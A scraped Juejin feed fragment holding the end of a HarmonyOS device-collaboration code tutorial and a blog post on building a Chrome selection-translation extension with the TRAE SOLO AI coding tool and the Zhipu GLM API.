      hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`接受连接失败: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
    }
  }

  <span class="hljs-comment">// 从协同参数创建会话</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">createSessionFromParam</span>(<span class="hljs-attr">collabParam</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Object</span>&gt;): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">let</span> sessionId = -<span class="hljs-number">1</span>;
    <span class="hljs-keyword">const</span> peerInfo = collabParam[<span class="hljs-string">"PeerInfo"</span>] <span class="hljs-keyword">as</span> abilityConnectionManager.<span class="hljs-property">PeerInfo</span>;
    <span class="hljs-keyword">const</span> connectOptions = collabParam[<span class="hljs-string">"ConnectOption"</span>] <span class="hljs-keyword">as</span> abilityConnectionManager.<span class="hljs-property">ConnectOptions</span>;

    <span class="hljs-keyword">if</span> (!peerInfo || !connectOptions) <span class="hljs-keyword">return</span> sessionId;

    <span class="hljs-comment">// 配置数据传输能力</span>
    connectOptions.<span class="hljs-property">needSendData</span> = <span class="hljs-literal">true</span>;
    connectOptions.<span class="hljs-property">needSendStream</span> = <span class="hljs-literal">true</span>;

    <span class="hljs-keyword">try</span> {
      sessionId = abilityConnectionManager.<span class="hljs-title function_">createAbilityConnectionSession</span>(
        <span class="hljs-string">"collabTest"</span>, 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>, 
        peerInfo, 
        connectOptions
      );
    } <span class="hljs-keyword">catch</span> (error) {
      hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`创建会话失败: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
    }
    <span class="hljs-keyword">return</span> sessionId;
  }
}
</code></pre>
<h4 data-id="heading-11">4、 注册事件监听（两端都要加）</h4>
<p>连接成功后，通过监听事件获取连接状态和消息：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">registerEventListeners</span>(<span class="hljs-params">sessionId: <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-comment">// 监听连接成功事件</span>
  abilityConnectionManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">"connect"</span>, sessionId, <span class="hljs-function">(<span class="hljs-params">callbackInfo</span>) =&gt;</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`会话<span class="hljs-subst">${callbackInfo.sessionId}</span>连接成功`</span>);
  });

  <span class="hljs-comment">// 监听断开连接事件</span>
  abilityConnectionManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">"disconnect"</span>, sessionId, <span class="hljs-function">(<span class="hljs-params">callbackInfo</span>) =&gt;</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`会话<span class="hljs-subst">${callbackInfo.sessionId}</span>已断开`</span>);
  });

  <span class="hljs-comment">// 监听接收消息事件</span>
  abilityConnectionManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">"receiveMessage"</span>, sessionId, <span class="hljs-function">(<span class="hljs-params">callbackInfo</span>) =&gt;</span> {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`收到消息: <span class="hljs-subst">${callbackInfo.message}</span>, 会话ID: <span class="hljs-subst">${callbackInfo.sessionId}</span>`</span>);
    <span class="hljs-comment">// 这里可以处理业务逻辑，比如更新UI显示消息</span>
  });
}
</code></pre>
<h4 data-id="heading-12">5、 发送消息（两端都可发）</h4>
<p>连接成功后，用<code>sendMessage</code>发送文本信息：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendTestMessage</span>(<span class="hljs-params">sessionId: <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> abilityConnectionManager.<span class="hljs-title function_">sendMessage</span>(sessionId, <span class="hljs-string">"这是来自设备A的测试消息"</span>);
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'消息发送成功'</span>);
  } <span class="hljs-keyword">catch</span> (error) {
    hilog.<span class="hljs-title function_">error</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">`消息发送失败: <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(error)}</span>`</span>);
  }
}
</code></pre>
<h4 data-id="heading-13">6、 结束协同（关键！避免资源泄露）</h4>
<p>业务完成后一定要断开连接或销毁会话：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">endCollaboration</span>(<span class="hljs-params">sessionId: <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-keyword">if</span> (sessionId === -<span class="hljs-number">1</span>) {
    hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'无效的会话ID'</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 短期还需协同：只断开连接，保留sessionId</span>
  abilityConnectionManager.<span class="hljs-title function_">disconnect</span>(sessionId);
  hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'已断开连接'</span>);

  <span class="hljs-comment">// 长期不用：销毁会话（自动断开连接）</span>
  abilityConnectionManager.<span class="hljs-title function_">destroyAbilityConnectionSession</span>(sessionId);
  hilog.<span class="hljs-title function_">info</span>(<span class="hljs-number">0x0000</span>, <span class="hljs-string">'testTag'</span>, <span class="hljs-string">'已销毁会话'</span>);
}
</code></pre>
<h3 data-id="heading-14">五、注意事项：</h3>
<ol>
<li>仅支持API 18及以上版本，且设备必须登录<strong>相同华为账号</strong></li>
<li>只有<strong>相同bundleName</strong>的UIAbility才能协同（比如都是“com.example.remotephotodemo”）</li>
<li>协同结束后一定要及时关闭，锁屏或退后台5秒未申请长时任务，协同会被系统强制结束</li>
<li>传输隐私数据时，记得加弹框提醒用户（系统不审查传输内容）</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从没写过浏览器插件？我用 TRAE SOLO 2 小时就完成了专属翻译工具]]></title>    <link>https://juejin.cn/post/7576130618904608804</link>    <guid>https://juejin.cn/post/7576130618904608804</guid>    <pubDate>2025-11-24T13:51:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576130618904608804" data-draft-id="7576273949178331199" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从没写过浏览器插件？我用 TRAE SOLO 2 小时就完成了专属翻译工具"/> <meta itemprop="keywords" content="Trae,AI编程,人工智能"/> <meta itemprop="datePublished" content="2025-11-24T13:51:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="飞哥数智谈"/> <meta itemprop="url" content="https://juejin.cn/user/3825956195409223"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从没写过浏览器插件？我用 TRAE SOLO 2 小时就完成了专属翻译工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3825956195409223/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    飞哥数智谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T13:51:37.000Z" title="Mon Nov 24 2025 13:51:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>每个程序员估计都有过，把自己常用的软件全部自行实现一遍的想法。</p>
<p>听起来很极客，但实现起来的时间成本太高了。</p>
<p>但现在不一样了——有了 <code>TRAE SOLO</code>，我们只要描述清楚想法，就可以<strong>一站式快速搞定</strong>。我感觉这个事情，可以再试试。</p>
<p>毕竟，一个个完全符合自己偏好的工具，用起来心情都会好上不少。</p>
<p>今天，我们就从<strong>浏览器翻译插件</strong>开始~</p>
<h2 data-id="heading-0">项目背景</h2>
<p>浏览器中翻译应该是非常高频的一个场景，但之前的翻译插件一直都不怎么好用，直到我了解到“沉浸式翻译”插件。</p>
<p>不得不承认，这个插件非常好用，分别在每段原文下方或旁边显示翻译内容，直观，可对照，支持翻译接口和各类AI。</p>
<p>但前阵子的安全事件，让我感觉还是自己鼓捣一个吧。</p>
<h2 data-id="heading-1">名词解释</h2>
<p>因为我之前从未有过浏览器插件开发的经验，因此需要提前了解下相关概念。</p>
<ul>
<li><strong>浏览器插件</strong>：一套基于网页技术（HTML/CSS/JavaScript）+ 浏览器提供的扩展 API 组成的文件集合（最终打包成 .crx/.xpi 等格式），运行在浏览器的 “沙箱环境” 中。</li>
<li><strong>manifest.json</strong>：<strong>重点中的重点</strong>，插件总配置，包括名称、权限、功能模块等。</li>
<li><strong>popup.html</strong>：点击插件图标后弹出的小窗口，本质是一个迷你网页，支持所有 HTML 语法。</li>
<li><strong>content script（可选）</strong>：注入到目标网页中的 JS/CSS，能直接操作网页 DOM（比如修改网页文字、隐藏广告）；</li>
<li><strong>background service worker（可选）</strong>：插件的 “后台服务”，即使 popup 关闭也能运行，用于监听事件或发起请求。</li>
<li><strong>Options</strong>：插件的 “设置面板”，专门用来让用户自定义插件功能的独立页面，比如开关功能、修改参数、保存偏好设置等。</li>
</ul>
<h2 data-id="heading-2">实操记录</h2>
<p>基础概念了解后，我们就可以开始了。</p>
<p>开发软件依然是 <code>TRAE SOLO</code>，本次我们选择了 <code>SOLO Coder</code> 智能体。</p>
<h3 data-id="heading-3">前置准备</h3>
<p>翻译工作，我们直接采用完全免费的 <code>GLM-4.5-Flash</code> 模型。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4555a20a35d94412ac075c16113dde1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=H17sN3Na%2BrNp472T2i5k4P6dKbw%3D" alt="" loading="lazy"/></p>
<p>只需要注册，并创建 <code>API Key</code> 即可。</p>
<p>之前有分享过，这里就不再赘述。</p>
<h3 data-id="heading-4">初版生成</h3>
<p><strong>指令</strong></p>
<p>除了说明我要做什么之外，额外明确了技术栈采用智谱API，并给出官方文档中 cURL 的代码示例。</p>
<pre><code class="hljs language-vbnet" lang="vbnet">我要实现一个chrome 浏览器插件，主要实现网站页面上选中内容的翻译，翻译结果通过浮动弹窗显示在选中内容上方。

翻译接口采用智谱大模型api，glm-<span class="hljs-number">4.5</span>-flash。
curl示例如下：
curl -X POST <span class="hljs-string">" https://open.bigmodel.cn/api/paas/v4/chat/completions "</span> \
-H <span class="hljs-string">"Content-Type: application/json"</span> \
-H <span class="hljs-string">"Authorization: Bearer &lt;你的 API Key&gt; "</span> \
-d <span class="hljs-comment">'{</span>
<span class="hljs-string">"model"</span>: <span class="hljs-string">"glm-4.5"</span>,
<span class="hljs-string">"messages"</span>: [
{
<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
<span class="hljs-string">"content"</span>: <span class="hljs-string">"作为一名营销专家，请为我的产品创作一个吸引人的口号"</span>
},
{
<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>,
<span class="hljs-string">"content"</span>: <span class="hljs-string">"当然，要创作一个吸引人的口号，请告诉我一些关于您产品的信息"</span>
},
{
<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
<span class="hljs-string">"content"</span>: <span class="hljs-string">"智谱AI 开放平台"</span>
}
],
<span class="hljs-string">"thinking"</span>: {
<span class="hljs-string">"type"</span>: <span class="hljs-string">"enabled"</span>
},
<span class="hljs-string">"max_tokens"</span>: <span class="hljs-number">4096</span>,
<span class="hljs-string">"temperature"</span>: <span class="hljs-number">0.6</span>
}<span class="hljs-comment">'</span>
</code></pre>
<p><strong>过程</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0df21a2164a4466b9e0ba5563eb94de7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=OufMdwOVmBt1uVwEHPC9h3%2FaKoA%3D" alt="" loading="lazy"/></p>
<p>先是照常生成文档。</p>
<p>不得不再次感叹，这个文档内容是真的详细。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/094a3f220c02472f95d3c66d0e0adc2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=yUAdohk%2BJ6KENXxjlZ6ekW3Gj9E%3D" alt="" loading="lazy"/></p>
<p>并且，还非常靠谱的帮我设计了 API Key 的安全存储方案。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6adca9127d2347b0a239937a6e59ea99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=KszJlrxH5zQCwuQF2QKQ5XuLdu4%3D" alt="" loading="lazy"/></p>
<p>毕竟，我一个浏览器插件小白，它要不告诉我，我还真不知道有个 <code>Options</code> 可以快速设置。</p>
<p>再然后，给出了相关的参考链接，方便我们了解核对。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7264464dba2748b78c4ec738c7730eec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=99TKeM3bzZ1SwsPZmgLfLauVP1c%3D" alt="" loading="lazy"/></p>
<p>确认文档后，<code>SOLO</code> 就直接按计划生成了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea40031c559f44eba3522747977350ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=amymafqW9QhftXANyL%2FyKktFJ4E%3D" alt="" loading="lazy"/></p>
<p><strong>结果</strong></p>
<p>之前使用自己熟悉的技术栈的时候，执行总结一般都是很快扫完的。</p>
<p>今天，上手一个新的领域才发现，<code>SOLO</code> 给出的总结也非常详细。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34279d6119a5480fafd5360469658277~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=pbZHv7J7OwhMDZi8Ap8PGQivScA%3D" alt="" loading="lazy"/></p>
<p>最主要的是接下来我需要如何调试，也帮我指明了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0e507336e864665b915e7844d0e3420~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=KpBMRzElk3131%2Bbz5%2Fc%2Bkk9Lg3M%3D" alt="" loading="lazy"/></p>
<p>此时生成代码结构如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/706aeac3451b49928a6e7f5a2d6ec46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=189f1GxRpLtf%2BO6KJ1GUDWqLOFQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">本地调试</h3>
<p>代码已经生成完了，下面我们按照前面 <code>SOLO</code> 给出的步骤，一步步操作即可。</p>
<p><strong>第一步</strong>，打开 <code>Chrome</code>，地址栏输入：<code>chrome://extensions/</code>，你可以通过插件管理菜单进入。</p>
<p>然后按照下图的箭头指示操作。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c9a2c615e95470fbe908f12815e43e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=l1ljIDiXbRZqCKwHQIkbZc38wzk%3D" alt="" loading="lazy"/></p>
<ol>
<li>右上角“Developer mode”，打开开发者模式；</li>
<li>左侧“Load unpacked”，选择项目跟路径，如果没有错误，插件会显示在图中位置。</li>
</ol>
<p><strong>第二步</strong>，打开<code>Options</code>界面。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a7316bd059e4cd4b4bcb0b2e2a33593~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=elvjzxdXVHqqZgY5yseuOrphDNg%3D" alt="" loading="lazy"/></p>
<p>设置 <code>API Key</code>，请忽略设置页面的简陋。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90daf4c3423a491c94d4ca2ebaa7c5b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=J1itowaPRg%2BcU8EDR4hS1SetHT0%3D" alt="" loading="lazy"/></p>
<p><strong>第三步</strong>，在英文网站中选择内容。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b7f8a9d267645999215cf10b85fd43d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=3Y%2BATqbNyFUvb8n49DgSTOgPGbM%3D" alt="" loading="lazy"/></p>
<p>点击“翻译”，查看效果。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc522558902040d0854030abbd45225c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=3VqagQDgEt%2FeCycLxHSpvEIysLM%3D" alt="" loading="lazy"/></p>
<p>哦耶，直接成功！</p>
<blockquote>
<p>如果有跟练的，测试链接：<a href="https://docs.trae.ai/ide/what-is-trae?_lang=en" target="_blank" title="https://docs.trae.ai/ide/what-is-trae?_lang=en" ref="nofollow noopener noreferrer">docs.trae.ai/ide/what-is…</a></p>
</blockquote>
<h3 data-id="heading-6">界面优化</h3>
<p>上面已经实现了翻译效果，但是界面有点难受。</p>
<p>没有有效利用屏幕宽度，并且还遮挡了选中的内容。</p>
<p>不用急，我们再追加一次对话，依然是 <code>SOLO Coder</code> 智能体。</p>
<p><strong>指令</strong></p>
<pre><code class="hljs">浮窗宽度和选中文字同宽；
浮窗定位应该在选中文字整体的下方，不要遮挡选中文字；
点击关闭后，应该清空翻译结果，并可再次进行下次翻译。
</code></pre>
<p><strong>过程</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17e5916f114947c090153b36d9364f8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=oay4OCVkNzmePECkqHS4WbY6Kek%3D" alt="" loading="lazy"/></p>
<p><strong>效果</strong></p>
<p>再次打开插件管理页面，删除“Remove”原有版本的插件，重新“Load unpacked”，再次测试。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53fdd00dd15b4ac6b9528a7fc4259b2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764597189&amp;x-signature=IybYoTyQTpmzm%2FVQI%2FHLs6MjHlg%3D" alt="" loading="lazy"/></p>
<p>理解非常到位，效果也很完美，收工。</p>
<h2 data-id="heading-7">实践体会</h2>
<p>今天实现这个插件，一共花费了 1 小时 40 分钟左右，这还包含了采用 <code>SOLO Builder</code> 智能体未成功的时间。</p>
<h3 data-id="heading-8">Builder 和 Coder 的挑选</h3>
<p><code>SOLO Builder</code> 适合前端应用，所以，我首选的就是它，但效果不佳。</p>
<p>我修复了3次之后，才能运行，并且效果还不是很好。</p>
<p>于是，我果断清空代码，重新开始，并更换了 <code>SOLO Coder</code>。</p>
<p>如上所示，一次过，这才像 <code>SOLO</code> 嘛。</p>
<p>小体会：<strong>一定要根据任务选择合适的模型或者智能体，也许可以事半功倍哦。</strong></p>
<h3 data-id="heading-9">使用AI返回的名词</h3>
<p>“界面优化”的对话中，我没有使用“初版生成”提示词中的“浮动弹窗”，而是使用了 AI 生成的文档中的“浮窗”。</p>
<p>这是一个实践的小技巧，<strong>尽量使用 AI 返回的名词，这样，它对你的指令理解会更加到位</strong>。</p>
<h3 data-id="heading-10">外部API调用使用示例代码</h3>
<p>我们在开发应用的过程中，会碰到很多需要调用外部 API 的情况。</p>
<p>我们可以把 API 文档给到 AI，但我更喜欢直接<strong>把官网的样例代码给到 AI</strong>。</p>
<p>毕竟，自然语言容易存在歧义，代码很少有歧义的。</p>
<h2 data-id="heading-11">结语</h2>
<p>今天，我们从0开始，实现了一个浏览器插件的开发，大家可以根据需要自行尝试。</p>
<p>有了 <code>SOLO</code>，实现这些小工具，真的又快又省心。</p>
<p>不过，这个插件目前还仅仅是初版，接下来，我会把更多好用的特性加进去，希望可以真正用起来。</p>
